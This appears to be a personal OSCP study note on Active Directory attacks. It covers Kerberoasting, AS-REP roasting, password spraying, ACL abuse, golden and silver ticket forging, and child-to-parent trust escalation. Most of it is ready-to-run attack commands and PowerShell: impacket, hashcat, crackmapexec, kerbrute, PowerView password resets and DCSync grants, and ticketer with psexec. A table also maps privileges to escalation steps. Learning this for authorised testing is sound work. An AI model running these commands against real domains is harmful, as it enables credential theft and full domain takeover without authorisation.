---
status: working
tags:
  - active-directory
  - kerberoast
  - acl-abuse
  - kerberos
---
> *AD Attacks:* Turning a domain foothold into credentials and privilege. Kerberoasting, AS-REP roasting, password spraying, ACL/DACL abuse, and (after compromise) Kerberos ticket forging and trust abuse. Trigger: you have at least one domain credential, or a username list, or a BloodHound edge from something you own. Pairs with [[03D - AD Enumeration]] (find the targets) and [[03F - AD Lateral Movements & Persistence]] (use what you get).

## Kerberoasting

Any authenticated user can request a service ticket for an SPN account, and it is encrypted with that account's password hash, so you crack it offline. Service accounts often have weak passwords, and no admin is needed.

```bash
impacket-GetUserSPNs corp.com/user:pass -dc-ip $IP -request -outputfile kerb.hash
impacket-GetUserSPNs corp.com/user:pass -dc-ip $IP -request-user sqldev -outputfile sqldev.hash
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
```
On a Windows foothold: `Rubeus.exe kerberoast /nowrap /outfile:kerb.hash` (see [[11B - Rubeus]]).

> [!note]
> If `GetUserSPNs` errors on clock skew, sync time: `sudo ntpdate $IP`. Cracked service-account passwords go straight back into [[09B - Brute Forcing & Spraying]].

## AS-REP Roasting

Accounts with "Do not require Kerberos preauthentication" hand out an encrypted blob to anyone who asks. You do not even need creds, just a username list (the `kerbrute` list from [[03D - AD Enumeration]]).

```bash
impacket-GetNPUsers corp.com/ -dc-ip $IP -usersfile users.txt -no-pass -format hashcat
impacket-GetNPUsers corp.com/santi -dc-ip $IP -no-pass
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```
On a Windows foothold: `Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep.hash`.

## Password Spraying

Spray one password across many users (not many passwords against one user) to avoid lockouts. Check the lockout policy first (`--pass-pol` / `getdompwinfo`).

```bash
crackmapexec smb $IP -u users.txt -p 'Season2025!' --continue-on-success | grep +
kerbrute passwordspray -d corp.com --dc $IP users.txt 'Season2025!'          # quieter (Kerberos pre-auth)
crackmapexec smb 10.10.10.0/24 --local-auth -u administrator -H <NTLM> | grep +   # local-admin reuse, no domain lockout
```

> [!note]
> Seasonal and company-name passwords land more than you would expect. The `--local-auth` + hash form is the safe way to test local-admin reuse without touching domain lockout counters.

## ACL / DACL Abuse

When BloodHound shows an edge (GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddMember) from something you own.

```bash
net rpc password "targetuser" "NewPass123!" -U corp.com/user%pass -S $IP    # ForceChangePassword
net group "Target Group" user /add /domain                                  # AddMember
```

> [!example] PowerView ACL abuse on a Windows foothold
> ```powershell
> $sp = ConvertTo-SecureString 'pass' -AsPlainText -Force
> $cred = New-Object System.Management.Automation.PSCredential('CORP\user',$sp)
> Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'New123!' -AsPlainText -Force) -Credential $cred
> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members victim -Credential $cred
> Set-DomainObject -Identity victim -SET @{serviceprincipalname='fake/SPN'} -Credential $cred   # targeted Kerberoast via GenericWrite
> Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=com' -PrincipalIdentity user -Rights DCSync -Credential $cred   # grant self DCSync via WriteDacl
> ```
> From Kali, [[11C - BloodyAD]] does the same over LDAP with one consistent syntax.

### Rights & Privileges Decoder (see it → do this)

| Right / privilege                        | Meaning → what you do                                              |
| ---------------------------------------- | ------------------------------------------------------------------ |
| **SeImpersonate / SeAssignPrimaryToken** | Potato → SYSTEM ([[05C - Windows Privilege Escalation]])           |
| **SeBackup / SeRestore**                 | Read any file → copy SAM+SYSTEM (or NTDS) → secretsdump offline    |
| **SeDebug**                              | Access any process → dump LSASS for creds                          |
| **SeLoadDriver**                         | Load a vulnerable driver → kernel-level SYSTEM                     |
| **SeTakeOwnership**                      | Take ownership of a file/key → grant yourself write → modify       |
| **GenericAll (user)**                    | Full control → reset password, or set a fake SPN and Kerberoast    |
| **GenericAll (group)**                   | Add yourself to the group                                          |
| **GenericAll (computer)**                | RBCD / read LAPS / shadow-credentials                              |
| **GenericWrite (user)**                  | Set an SPN (targeted Kerberoast) or a logon script                 |
| **WriteDACL**                            | Grant yourself rights on the object, e.g. add DCSync on the domain |
| **WriteOwner**                           | Become owner → then WriteDACL → full control                       |
| **ForceChangePassword**                  | Reset the target's password without the old one                    |
| **AddMember**                            | Add an account to a group                                          |
| **ReadLAPSPassword / ReadGMSAPassword**  | Read the managed local-admin / gMSA password directly              |
| **DnsAdmins membership**                 | Load a malicious DLL into the DNS service → SYSTEM on the DC       |
| **Backup Operators membership**          | Gains SeBackup/SeRestore → read hives / NTDS                       |
| **Exchange Windows Permissions**         | Often WriteDACL on the domain → grant self DCSync                  |

> [!note]
> Highest-value chain: WriteDACL on the domain → grant `DS-Replication-Get-Changes-All` → DCSync ([[03F - AD Lateral Movements & Persistence]]).

## Kerberos Ticket Forging (Golden / Silver)

> [!warning] OSCP Note
> These are usually for persistence or crossing a trust after you already own the domain, not the primary path.

**Golden Ticket**
Trigger: You have the `krbtgt` hash (from DCSync/NTDS). Because krbtgt signs all Kerberos tickets, its hash forges a valid ticket for any user, a domain-wide master key until krbtgt is rotated twice.

```bash
impacket-ticketer -nthash <krbtgt-hash> -domain-sid <S-1-5-21-...> -domain corp.com Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec corp.com/Administrator@<DC> -k -no-pass
```

**Silver Ticket**
Trigger: A service account or machine account hash. Forges a ticket for that one service on that one host, narrower but stealthier because it never contacts the DC. mimikatz/Rubeus forms in [[11B - Rubeus]].

## Domain Trusts (child → parent, cross-forest)

Trigger: `Get-DomainTrust`/`nltest` shows a trust, you own a child domain but need the parent.

```bash
impacket-raiseChild corp.local/childadmin:'pass'@<child-DC>   # automated SID-history escalation
```

> [!note]
> The classic child→parent attack builds a Golden Ticket in the child with an extra SID for the parent's Enterprise Admins group (SID history), because the trust does not filter it. `raiseChild` automates it, the manual path is DCSync the child krbtgt → `ticketer` with `-extra-sid <parent-EA-SID>` → psexec the parent DC. Cross-forest: Kerberoast across the trust with `GetUserSPNs -target-domain`.

## See Also

- [[03D - AD Enumeration]] for finding SPNs, no-preauth accounts, and ACL edges
- [[03F - AD Lateral Movements & Persistence]] for DCSync and using the hashes
- [[11B - Rubeus]] and [[11C - BloodyAD]] for driving the two tools this leans on
- [[09C - Hash Cracking]] for cracking roast output
- Source: *OSCP Field Manual* sections 7.1, 7.4, 7.4.1
